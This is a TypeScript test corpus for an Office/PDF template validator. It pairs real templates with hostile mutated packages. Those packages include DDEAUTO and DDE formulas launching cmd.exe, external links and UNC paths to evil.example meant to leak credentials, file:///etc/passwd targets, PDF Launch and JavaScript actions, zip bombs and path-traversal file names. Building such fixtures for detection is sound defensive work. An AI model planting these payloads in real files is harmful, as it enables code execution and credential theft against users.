// Corpus of the template-validator eval and of the OfficeCLI differential: 5 real templates from the repo's templates/ tree
// plus hostile or malformed packages (mostly mutations of a real template). Shared by run-template-validator.ts and
// run-template-differential.ts so both judge the same packages.
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { strToU8, unzipSync, zipSync, type Zippable } from 'fflate';
import { MANIFEST_NAME, sha256Hex } from '../src/marketplace/artifacts.ts';
import { repoRoot, type Case } from './lib.ts';

export const tpl = (rel: string) => new Uint8Array(readFileSync(join(repoRoot, 'templates', rel)));
const PNG = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 1, 2, 3, 4]);
export type Format = 'pptx' | 'docx' | 'xlsx' | 'pdf';

export function pack(format: Format, file: Uint8Array, previews: Record<string, Uint8Array> = { 'previews/1.png': PNG }): Uint8Array {
  const files: Record<string, Uint8Array> = { [`template.${format}`]: file, ...previews };
  const manifest = { schema: 'agentic.marketplace/1', id: 'eval/template', type: 'template', version: '1.0.0', title: 'Eval template', summary: 'An eval template.', license: 'MIT', compat: { app: '*' },
    dependencies: [], permissions: [], files: Object.entries(files).map(([path, b]) => ({ path, sha256: sha256Hex(b), size: b.length })),
    payload: { format, file: `template.${format}`, previews: Object.keys(previews) } };
  return zipSync({ [MANIFEST_NAME]: strToU8(JSON.stringify(manifest)), ...files });
}
export const mutate = (b: Uint8Array, edit: (z: Record<string, Uint8Array>) => void): Uint8Array => { const z = unzipSync(b); edit(z); return zipSync(z as Zippable); };
export const T = (t: string) => `http://schemas.openxmlformats.org/officeDocument/2006/relationships/${t}`;
export const R = (inner: string) => `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${inner}</Relationships>`;
const utf16 = (s: string) => { const b = new Uint8Array(2 + s.length * 2); b[0] = 0xff; b[1] = 0xfe; for (let i = 0; i < s.length; i++) { b[2 + 2 * i] = s.charCodeAt(i) & 255; b[3 + 2 * i] = s.charCodeAt(i) >> 8; } return b; };
export const dec = (b: Uint8Array) => new TextDecoder().decode(b);

export const PPTX = tpl('pptx/board-update.pptx'), DOCX = tpl('docx/board-memo.docx'), XLSX = tpl('xlsx/budget-tracker.xlsx');

const ok = (id: string, note: string, build: () => Uint8Array): Case => ({ id, label: 'benign', category: 'real-template', note, build });
const bad = (id: string, category: string, note: string, build: () => Uint8Array): Case => ({ id, label: 'malicious', category, note, build });

export const cases: Case[] = [
  ok('t01-pptx-board-update', 'templates/pptx/board-update.pptx', () => pack('pptx', PPTX)),
  ok('t02-pptx-investor-pitch', 'templates/pptx/investor-pitch.pptx', () => pack('pptx', tpl('pptx/investor-pitch.pptx'))),
  ok('t03-docx-board-memo', 'templates/docx/board-memo.docx', () => pack('docx', DOCX)),
  ok('t04-xlsx-budget-tracker', 'templates/xlsx/budget-tracker.xlsx', () => pack('xlsx', XLSX)),
  ok('t05-pdf-one-pager', 'templates/pdf/one-pager.pdf', () => pack('pdf', tpl('pdf/one-pager.pdf'))),

  bad('x01-macro-vba', 'macro', 'pptx with ppt/vbaProject.bin', () => pack('pptx', mutate(PPTX, (z) => { z['ppt/vbaProject.bin'] = new Uint8Array([1, 2, 3]); }))),
  bad('x02-macro-content-type', 'macro', 'main part declared macroEnabled in [Content_Types].xml', () => pack('docx', mutate(DOCX, (z) => {
    z['[Content_Types].xml'] = strToU8(dec(z['[Content_Types].xml']).replace('application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml', 'application/vnd.ms-word.document.macroEnabled.main+xml'));
  }))),
  bad('x03-external-http-link', 'external-link', 'relationship with TargetMode External to http://', () => pack('docx', mutate(DOCX, (z) => { z['word/_rels/x.rels'] = strToU8(R(`<Relationship Id="a" Type="${T('attachedTemplate')}" Target="http://evil.example/t.dotm" TargetMode="External"/>`)); }))),
  bad('x04-external-unc', 'external-link', 'UNC path target (credential leak via SMB)', () => pack('docx', mutate(DOCX, (z) => { z['word/_rels/x.rels'] = strToU8(R(`<Relationship Id="a" Type="${T('oleObject')}" Target="\\\\evil.example\\share\\x" TargetMode="External"/>`)); }))),
  bad('x05-external-scheme-relative', 'external-link', 'scheme-relative //host target', () => pack('pptx', mutate(PPTX, (z) => { z['ppt/_rels/y.rels'] = strToU8(R(`<Relationship Id="a" Type="${T('hyperlink')}" Target="//evil.example/x" TargetMode="External"/>`)); }))),
  bad('x06-external-file-uri', 'external-link', 'file:/// target', () => pack('pptx', mutate(PPTX, (z) => { z['ppt/_rels/y.rels'] = strToU8(R(`<Relationship Id="a" Type="${T('hyperlink')}" Target="file:///etc/passwd" TargetMode="External"/>`)); }))),
  bad('x07-dde-docx-field', 'dde', 'DDEAUTO field launching cmd.exe in word/document.xml', () => pack('docx', mutate(DOCX, (z) => {
    z['word/document.xml'] = strToU8(dec(z['word/document.xml']).replace('</w:body>', '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc.exe" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p></w:body>'));
  }))),
  bad('x08-dde-xlsx-formula', 'dde', 'DDE formula =cmd|... in a worksheet cell', () => pack('xlsx', mutate(XLSX, (z) => {
    const k = Object.keys(z).find((n) => /^xl\/worksheets\/sheet\d+\.xml$/.test(n))!;
    z[k] = strToU8(dec(z[k]).replace('</sheetData>', `<row r="999"><c r="A999"><f>cmd|' /C calc'!A0</f></c></row></sheetData>`));
  }))),
  bad('x09-zip-bomb', 'bomb', 'a 80 MiB all-zero part (over the 64 MiB package cap once inflated)', () => zipSync({ ...unzipSync(pack('pptx', PPTX)), 'ppt/bomb.bin': new Uint8Array(80 * 1024 * 1024) } as Zippable, { level: 1 })),
  bad('x10-truncated', 'malformed', 'the pptx cut in half', () => pack('pptx', PPTX.slice(0, PPTX.length >> 1))),
  bad('x11-no-content-types', 'malformed', '[Content_Types].xml removed', () => pack('docx', mutate(DOCX, (z) => { delete z['[Content_Types].xml']; }))),
  bad('x12-override-missing-part', 'malformed', 'an Override names a part that is not in the package', () => pack('docx', mutate(DOCX, (z) => {
    z['[Content_Types].xml'] = strToU8(dec(z['[Content_Types].xml']).replace('</Types>', '<Override PartName="/word/ghost.xml" ContentType="application/xml"/></Types>'));
  }))),
  bad('x13-svg-preview', 'disguised-file', 'an SVG with script named previews/1.png', () => pack('pptx', PPTX, { 'previews/1.png': strToU8('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>') })),
  bad('x14-html-as-pptx', 'disguised-file', 'an HTML page named template.pptx', () => pack('pptx', strToU8('<html><script>location="http://evil.example"</script></html>'))),
  bad('x15-elf-in-embeddings', 'executable', 'ELF magic in a non-XML part', () => pack('pptx', mutate(PPTX, (z) => { z['ppt/media/extra.dat'] = new Uint8Array([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0, 0, 0, 0, 0]); }))),
  bad('x16-case-variant-attributes', 'evasion', 'duplicate Target attributes differing only by case, hiding a file: target', () => pack('docx', mutate(DOCX, (z) => {
    z['word/_rels/x.rels'] = strToU8(R(`<Relationship Id="a" Type="${T('hyperlink')}" Target="https://example.com/ok" TARGET="file:///etc/passwd" TargetMode="External"/>`));
  }))),
  bad('x17-utf16-rels', 'evasion', 'a UTF-16LE rels file with a file: external target', () => pack('docx', mutate(DOCX, (z) => { z['word/_rels/x.rels'] = utf16(R(`<Relationship Id="a" Type="${T('hyperlink')}" Target="file:///etc/passwd" TargetMode="External"/>`)); }))),
  bad('x18-nested-workbook-bomb', 'bomb', '40 embedded chart workbooks of 60 MiB each', () => {
    const big = zipSync({ 'xl/big.bin': new Uint8Array(60 * 1024 * 1024) }, { level: 1 });
    return pack('pptx', mutate(PPTX, (z) => {
      const rk = Object.keys(z).find((n) => /charts\/_rels\/.*\.rels$/.test(n))!;
      let rels = '';
      for (let i = 0; i < 40; i++) { z[`ppt/embeddings/w${i}.xlsx`] = big; rels += `<Relationship Id="r${i}" Type="${T('package')}" Target="../embeddings/w${i}.xlsx"/>`; }
      z[rk] = strToU8(R(rels));
    }));
  }),
  bad('x19-pdf-javascript', 'pdf-active', 'PDF with /JavaScript in an OpenAction', () => pack('pdf', strToU8('%PDF-1.4\n1 0 obj\n<< /Type /Catalog /OpenAction << /S /JavaScript /JS (app.alert\\(1\\)) >> >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n'))),
  bad('x20-pdf-launch', 'pdf-active', 'PDF with a /Launch action', () => pack('pdf', strToU8('%PDF-1.4\n1 0 obj\n<< /Type /Catalog /OpenAction << /S /Launch /F (cmd.exe) >> >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n'))),

  // ---- Plan 4 Task 11 hardening: one case per closed gap
  bad('h01-doctype-unlisted-part', 'xml-all-parts', 'DOCTYPE with an entity in customXml/item1.xml (not a listed part)', () => pack('docx', mutate(DOCX, (z) => { z['customXml/item1.xml'] = strToU8('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY a "x">]><r>&a;</r>'); }))),
  bad('h02-malformed-unlisted-part', 'xml-all-parts', 'unbalanced XML in customXml/item1.xml', () => pack('docx', mutate(DOCX, (z) => { z['customXml/item1.xml'] = strToU8('<r><a></r>'); }))),
  bad('h03-stylesheet-pi-first-bytes', 'processing-instruction', 'xml-stylesheet PI as the first bytes of docProps/core.xml', () => pack('docx', mutate(DOCX, (z) => { z['docProps/core.xml'] = strToU8('<?xml-stylesheet href="http://evil.example/x.xsl"?><r/>'); }))),
  bad('h04-pi-in-slide', 'processing-instruction', 'a custom PI inside a slide part', () => pack('pptx', mutate(PPTX, (z) => { z['ppt/slides/slide1.xml'] = strToU8(`<?xml version="1.0"?><?evil run?>${dec(z['ppt/slides/slide1.xml']).replace(/^<\?xml[^>]*\?>/, '')}`); }))),
  bad('h05-dde-glossary', 'dde', 'DDEAUTO field in word/glossary/document.xml (not a listed part)', () => pack('docx', mutate(DOCX, (z) => { z['word/glossary/document.xml'] = strToU8(`<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> DDEAUTO c:\\\\cmd.exe "/k calc" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p></w:body></w:document>`); }))),
  bad('h06-field-zero-width', 'dde', 'DDE field name with a zero-width space inside', () => pack('docx', mutate(DOCX, (z) => { z['word/document.xml'] = strToU8(dec(z['word/document.xml']).replace('</w:body>', '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> D\u200bDE a b c </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p></w:body>')); }))),
  bad('h07-field-deleted-instr', 'dde', 'DDE inside w:delInstrText', () => pack('docx', mutate(DOCX, (z) => { z['word/document.xml'] = strToU8(dec(z['word/document.xml']).replace('</w:body>', '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:delInstrText> DDE a b c </w:delInstrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p></w:body>')); }))),
  bad('h08-field-macrobutton', 'dde', 'MACROBUTTON field', () => pack('docx', mutate(DOCX, (z) => { z['word/document.xml'] = strToU8(dec(z['word/document.xml']).replace('</w:body>', '<w:p><w:fldSimple w:instr=" MACROBUTTON AutoOpen click "><w:r><w:t>x</w:t></w:r></w:fldSimple></w:p></w:body>')); }))),
  bad('h09-field-hyperlink-http', 'external-link', 'HYPERLINK field to http://', () => pack('docx', mutate(DOCX, (z) => { z['word/document.xml'] = strToU8(dec(z['word/document.xml']).replace('</w:body>', '<w:p><w:fldSimple w:instr=" HYPERLINK &quot;http://evil.example/x&quot; "><w:r><w:t>x</w:t></w:r></w:fldSimple></w:p></w:body>')); }))),
  bad('h10-xlsx-table-formula', 'dde', 'DDE in a table calculatedColumnFormula', () => pack('xlsx', mutate(XLSX, (z) => { z['xl/tables/table1.xml'] = strToU8(`<?xml version="1.0"?><table xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><tableColumns><tableColumn id="1"><calculatedColumnFormula>cmd|' /c calc'!A0</calculatedColumnFormula></tableColumn></tableColumns></table>`); }))),
  bad('h11-xlsx-validation-dde', 'dde', 'DDE() in a data validation formula1', () => pack('xlsx', mutate(XLSX, (z) => { z['xl/worksheets/sheetx.xml'] = strToU8(`<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><dataValidations><dataValidation><formula1>DDE("a","b","c")</formula1></dataValidation></dataValidations></worksheet>`); }))),
  bad('h12-script-element', 'svg-script', 'a <script> element in an unlisted XML part', () => pack('pptx', mutate(PPTX, (z) => { z['ppt/extra.xml'] = strToU8('<root><script>alert(1)</script></root>'); }))),
  bad('h13-svgblip', 'svg-script', 'SVG blip extension element in a slide', () => pack('pptx', mutate(PPTX, (z) => { z['ppt/slides/slide1.xml'] = strToU8(dec(z['ppt/slides/slide1.xml']).replace(/<\/p:sld>\s*$/, '<asvg:svgBlip xmlns:asvg="http://schemas.microsoft.com/office/drawing/2016/SVG/main"/></p:sld>')); }))),
  bad('h14-svg-as-png', 'svg-script', 'SVG with script stored as word/media/image99.png', () => pack('docx', mutate(DOCX, (z) => { z['word/media/image99.png'] = strToU8('<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>1</script></svg>'); }))),
  bad('h15-svg-content-type', 'svg-script', 'image/svg+xml declared as a Default content type', () => pack('docx', mutate(DOCX, (z) => { z['[Content_Types].xml'] = strToU8(dec(z['[Content_Types].xml']).replace('</Types>', '<Default Extension="vec" ContentType="image/svg+xml"/></Types>')); }))),
  bad('h16-vml-remote-href', 'external-link', 'VML o:href pointing at http://', () => pack('docx', mutate(DOCX, (z) => { z['word/vmlDrawing9.vml'] = strToU8('<xml xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office"><v:imagedata o:href="http://evil.example/p.png"/></xml>'); }))),
  bad('h17-rel-attached-template-internal', 'rel-kind', 'internal attachedTemplate relationship', () => pack('docx', mutate(DOCX, (z) => { z['word/_rels/settings.xml.rels'] = strToU8(R(`<Relationship Id="a" Type="${T('attachedTemplate')}" Target="document.xml"/>`)); }))),
  bad('h18-rel-customui', 'rel-kind', 'ribbon extensibility (customUI) relationship', () => pack('docx', mutate(DOCX, (z) => { z['_rels/.rels'] = strToU8(R(`<Relationship Id="e" Type="http://schemas.microsoft.com/office/2006/relationships/ui/extensibility" Target="word/document.xml"/>`)); }))),
  bad('h19-rel-kind-query', 'rel-kind', 'oleObject relationship type with a ?query suffix', () => pack('docx', mutate(DOCX, (z) => { z['word/_rels/settings.xml.rels'] = strToU8(R(`<Relationship Id="a" Type="${T('oleObject')}?x=1" Target="document.xml"/>`)); }))),
  bad('h20-xlsx-connections', 'remote-data', 'xl/connections.xml part', () => pack('xlsx', mutate(XLSX, (z) => { z['xl/connections.xml'] = strToU8('<connections/>'); }))),
  bad('h21-webextension-part', 'remote-data', 'word/webextensions/webextension1.xml', () => pack('docx', mutate(DOCX, (z) => { z['word/webextensions/webextension1.xml'] = strToU8('<we/>'); }))),
  bad('h22-html-part', 'disguised-file', 'word/media/page.html', () => pack('docx', mutate(DOCX, (z) => { z['word/media/page.html'] = strToU8('<html/>'); }))),
  bad('h23-trailing-dot-exe', 'name-trick', 'word/media/x.exe. (Windows strips the dot)', () => pack('docx', mutate(DOCX, (z) => { z['word/media/x.exe.'] = strToU8('MZ'); }))),
  bad('h24-percent-traversal-name', 'name-trick', 'part named word/%2e%2e/evil.xml', () => pack('docx', mutate(DOCX, (z) => { z['word/%2e%2e/evil.xml'] = strToU8('<r/>'); }))),
  bad('h25-fullwidth-slash-name', 'name-trick', 'part named with a fullwidth solidus (U+FF0F)', () => pack('docx', mutate(DOCX, (z) => { z['word\uff0fextra.xml'] = strToU8('<r/>'); }))),
  bad('h26-bidi-name', 'name-trick', 'part name with a right-to-left override', () => pack('docx', mutate(DOCX, (z) => { z['word/doc\u202Exlsx.xml'] = strToU8('<r/>'); }))),
  bad('h27-percent-twin', 'name-trick', 'word/%64ocument.xml shadows word/document.xml after decoding', () => pack('docx', mutate(DOCX, (z) => { z['word/%64ocument.xml'] = strToU8('<r/>'); }))),
  bad('h28-ads-colon', 'name-trick', 'NTFS alternate data stream name word/a.xml:evil.exe', () => pack('docx', mutate(DOCX, (z) => { z['word/a.xml:evil.exe'] = strToU8('<r/>'); }))),
  bad('h29-target-above-root', 'name-trick', 'relationship target that climbs above the root and is clamped onto a real part', () => pack('docx', mutate(DOCX, (z) => { z['word/_rels/settings.xml.rels'] = strToU8(R(`<Relationship Id="a" Type="${T('hyperlink')}" Target="../../word/document.xml"/>`)); }))),
  bad('h30-target-double-encoded', 'name-trick', 'relationship target %252e%252e/ (double-encoded traversal)', () => pack('docx', mutate(DOCX, (z) => { z['word/_rels/settings.xml.rels'] = strToU8(R(`<Relationship Id="a" Type="${T('hyperlink')}" Target="%252e%252e/word/document.xml"/>`)); }))),
  bad('h31-deep-nesting', 'budget', '5000-level nested XML in customXml (stack/time budget)', () => pack('docx', mutate(DOCX, (z) => { z['customXml/deep.xml'] = strToU8('<a>'.repeat(5000) + '</a>'.repeat(5000)); }))),
  bad('h32-nested-workbook-doctype', 'budget', 'chart workbook whose own customXml carries a DOCTYPE', () => pack('pptx', mutate(PPTX, (z) => {
    const rk = Object.keys(z).find((n) => /charts\/_rels\/.*\.rels$/.test(n))!;
    z['ppt/embeddings/w0.xlsx'] = zipSync({ '[Content_Types].xml': strToU8('<Types/>'), 'customXml/i.xml': strToU8('<!DOCTYPE r []><r/>') });
    z[rk] = strToU8(dec(z[rk]).replace('</Relationships>', `<Relationship Id="r0" Type="${T('package')}" Target="../embeddings/w0.xlsx"/></Relationships>`));
  }))),
  bad('h33-override-retypes-rels', 'opc-structure', 'Override gives a .rels part the application/xml content type (OfficeCLI: cannot open)', () => pack('docx', mutate(DOCX, (z) => { z['[Content_Types].xml'] = strToU8(dec(z['[Content_Types].xml']).replace('</Types>', '<Override PartName="/word/_rels/document.xml.rels" ContentType="application/xml"/></Types>')); }))),
  bad('h34-duplicate-override', 'opc-structure', 'second Override for the same part (OfficeCLI: cannot open)', () => pack('pptx', mutate(PPTX, (z) => { const m = /<Override PartName="\/ppt\/presentation\.xml"[^>]*\/>/.exec(dec(z['[Content_Types].xml']))!; z['[Content_Types].xml'] = strToU8(dec(z['[Content_Types].xml']).replace('</Types>', `${m[0]}</Types>`)); }))),
  bad('h35-main-part-retyped', 'opc-structure', 'document.xml declared application/xml', () => pack('docx', mutate(DOCX, (z) => { z['[Content_Types].xml'] = strToU8(dec(z['[Content_Types].xml']).replace('application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml', 'application/xml')); }))),
  bad('h36-duplicate-relationship-id', 'opc-structure', 'a Relationship repeated inside one .rels (OfficeCLI: ID conflict)', () => pack('pptx', mutate(PPTX, (z) => { const s = dec(z['ppt/_rels/presentation.xml.rels']); const m = /<Relationship [^>]*\/>/.exec(s)!; z['ppt/_rels/presentation.xml.rels'] = strToU8(s.replace('</Relationships>', `${m[0]}</Relationships>`)); }))),
  bad('h37-bad-xml-encoding', 'opc-structure', 'XML declaration with encoding="UT-8"', () => pack('docx', mutate(DOCX, (z) => { z['_rels/.rels'] = strToU8(dec(z['_rels/.rels']).replace(/encoding=(["'])[^"']*\1/i, 'encoding="UT-8"')); }))),
  bad('h38-rels-unknown-child', 'opc-structure', 'a foreign element inside _rels/.rels', () => pack('docx', mutate(DOCX, (z) => { z['_rels/.rels'] = strToU8(dec(z['_rels/.rels']).replace('</Relationships>', '<Junk/></Relationships>')); }))),
  bad('h39-rels-namespace-typo', 'opc-structure', 'OPC relationships namespace misspelled (OfficeCLI: Relationships tag expected at root level)', () => pack('pptx', mutate(PPTX, (z) => { z['ppt/slideLayouts/_rels/slideLayout3.xml.rels'] = strToU8(dec(z['ppt/slideLayouts/_rels/slideLayout3.xml.rels']).replace('openxmlformats.org/package', 'openxmlformats.rg/package')); }))),
  bad('h40-types-namespace-typo', 'opc-structure', 'content-types namespace misspelled (OfficeCLI: Required Types tag not found)', () => pack('xlsx', mutate(XLSX, (z) => { z['[Content_Types].xml'] = strToU8(dec(z['[Content_Types].xml']).replace('content-types', 'cntent-types')); }))),
  ok('b06-hyperlink-field-https-link-path', 'HYPERLINK field to https://example.com/link/import: the word "link" in a URL must not trip the LINK rule', () => pack('docx', mutate(DOCX, (z) => { z['word/document.xml'] = strToU8(dec(z['word/document.xml']).replace(/<w:sectPr[^>]*>(?![\s\S]*<w:sectPr)/, '<w:p><w:fldSimple w:instr=" HYPERLINK &quot;https://example.com/link/import&quot; "><w:r><w:t>x</w:t></w:r></w:fldSimple></w:p>$&')); }))),
];

